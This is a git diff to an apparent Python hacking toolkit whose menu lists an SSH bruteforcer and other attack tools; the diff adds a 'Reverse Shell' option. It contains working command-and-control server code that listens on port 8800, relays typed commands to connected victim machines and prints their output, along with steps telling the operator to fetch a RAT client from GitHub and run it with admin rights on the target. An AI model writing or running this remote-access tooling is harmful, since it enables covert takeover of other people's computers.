@@ -57,6 +57,8 @@ import hashlib
 import urllib.parse
 import shutil
 from zipfile import ZipFile 
+import threading
+import signal
 
 def check_internet():
     try:
@@ -274,7 +276,8 @@ def WEB():
         [12] Proxy Scraper & Checker (Multithreaded) 
         [13] Email Github Catcher
         [14] Secure shell SSH Bruteforcer
-        [15] Back''')
+        [15] Reverse Shell HandMain MAY NOT WORK !
+        [16] Back''')
 
         choice = input('Select an option: ')
 
@@ -307,6 +310,9 @@ def WEB():
         elif choice == '14':
             ssb()
         elif choice == '15':
+            os.system('cls' if os.name == 'nt' else 'clear')
+            instruction()
+        elif choice == '16':
             os.system('cls' if os.name == 'nt' else 'clear')
             main()
             return  
@@ -670,6 +676,67 @@ def ssb():
     
     else:
         ssb_install()       
-        
+
+HOST = '0.0.0.0'  
+PORT = 8800  
+
+clients = []  
+
+def shell(client_socket, address):
+    """ Gère la session shell pour un client donné """
+    print(f"[+] Client connecté: {address}")
+
+    while True:
+        try:
+            current_dir = client_socket.recv(1024).decode()
+            if not current_dir:
+                break  
+            print(current_dir, end='')  
+            
+            command = input()  
+
+            if command.lower() == 'exit':
+                client_socket.send(command.encode())
+                print("Fermeture de la connexion avec le client.")
+                break
+
+            client_socket.send(command.encode())
+
+            output = client_socket.recv(4096).decode()
+            print(output.strip(), end='\n')  
+  
+        except Exception as e:
+            print(f"Erreur lors de la communication avec le client : {e}")
+            break
+
+    client_socket.close()
+
+def start_server():
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.bind((HOST, PORT))
+    server_socket.listen(5)
+    print(f"[*] Serveur démarré sur {HOST}:{PORT}")
+
+    while True:
+        client_socket, address = server_socket.accept()
+        clients.append(client_socket)
+        client_thread = threading.Thread(target=shell, args=(client_socket, address))
+        client_thread.start()
+
+def handle_interrupt(signal, frame):
+    """ Gère l'interruption Ctrl+C en arrêtant le serveur proprement """
+    print("\n[!] Arrêt du serveur demandé.")
+    for client_socket in clients:
+        client_socket.close()  
+    sys.exit(0)
+
+def instruction():
+    input("Press enter after each slide! And now!")
+    input("1- download server.py from github on github.com/yureinox/RAT")
+    input("2- Execute using sudo or with admin for admin privilege in SHELL in the client pc or mac")
+    input("Press enter to continue to server side loading...")
+    os.system('cls' if os.name == 'nt' else 'clear')
+    start_server()
+
 if __name__ == "__main__":
     main()
